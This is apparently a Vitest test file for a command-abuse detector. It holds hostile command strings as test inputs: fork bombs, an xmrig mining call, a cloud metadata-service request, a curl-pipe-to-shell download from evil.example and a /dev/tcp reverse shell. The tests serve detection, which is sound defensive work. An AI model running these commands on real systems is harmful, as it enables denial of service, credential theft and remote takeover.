import { describe, expect, it } from 'vitest';

import { detectCommandAbuse } from './index.js';

describe('detectCommandAbuse — fork bomb', () => {
  it('flags the classic recursive fork bomb', () => {
    const signal = detectCommandAbuse('bash', ['-c', ':(){ :|:& };:']);
    expect(signal?.type).toBe('fork_bomb');
    expect(signal?.action).toBe('stop_workspace');
  });

  it('flags a named-function fork bomb variant', () => {
    const signal = detectCommandAbuse('bash', ['-c', 'boom(){ boom|boom& };boom']);
    expect(signal?.type).toBe('fork_bomb');
  });

  it('does NOT flag ordinary commands that merely contain the substring "bomb"', () => {
    // Previously the bare `|bomb` alternative matched any of these and hard-blocked them.
    expect(detectCommandAbuse('npm', ['install', 'bombadil'])).toBeUndefined();
    expect(detectCommandAbuse('git', ['clone', 'https://github.com/acme/bomb-defuser'])).toBeUndefined();
    expect(detectCommandAbuse('node', ['scripts/bomb-detector.js'])).toBeUndefined();
    expect(detectCommandAbuse('echo', ['the bomb squad is here'])).toBeUndefined();
  });

  it('does NOT flag a loop that legitimately mentions the word fork', () => {
    expect(detectCommandAbuse('node', ['fork-worker.js'])).toBeUndefined();
    expect(detectCommandAbuse('git', ['fetch', 'fork'])).toBeUndefined();
  });
});

describe('detectCommandAbuse — legitimate command chaining', () => {
  it('does NOT flag ordinary chained shell commands', () => {
    // These are normal developer workflows that were wrongly rejected as a hard 409.
    expect(detectCommandAbuse('sh', ['-c', 'npm run clean && rm -rf dist'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'cat config | sh'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'make build ; rm -f tmp'])).toBeUndefined();
    expect(detectCommandAbuse('sh', ['-c', 'echo hi && bash deploy.sh'])).toBeUndefined();
  });
});

describe('detectCommandAbuse — unambiguous patterns still flagged', () => {
  it('flags crypto mining', () => {
    expect(detectCommandAbuse('xmrig', ['--url', 'stratum+tcp://pool:3333'])?.type).toBe('crypto_mining');
  });

  it('flags metadata-service egress', () => {
    expect(detectCommandAbuse('curl', ['http://169.254.169.254/latest/meta-data/'])?.type).toBe('suspicious_egress');
  });

  it('flags download-and-execute (curl | sh)', () => {
    expect(detectCommandAbuse('sh', ['-c', 'curl http://evil.example/x.sh | sh'])?.type).toBe('malware_download');
  });

  it('flags a reverse shell', () => {
    expect(detectCommandAbuse('bash', ['-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'])?.type).toBe('reverse_shell');
  });
});
